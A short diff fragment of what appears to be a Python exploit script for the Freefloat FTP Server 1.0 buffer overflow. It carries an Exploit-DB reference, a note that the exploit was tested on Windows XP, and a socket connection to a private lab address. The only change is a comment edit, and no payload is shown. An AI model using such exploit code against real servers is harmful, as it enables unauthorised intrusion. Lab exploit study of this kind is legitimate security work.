@@ -6,7 +6,7 @@ import sys
 # Freefloat FTP Server 1.0
 # Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/40673
 # Exploit tested on Windows XP Pro SP3 FR
-# Note: other FTP commands are vulnerable to buffer overflow (https://www.exploit-db.com/search?q=freefloat)
+# Note: others FTP commands are vulnerable to buffer overflow (https://www.exploit-db.com/search?q=freefloat)
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connect=s.connect(('10.0.2.4',2121))
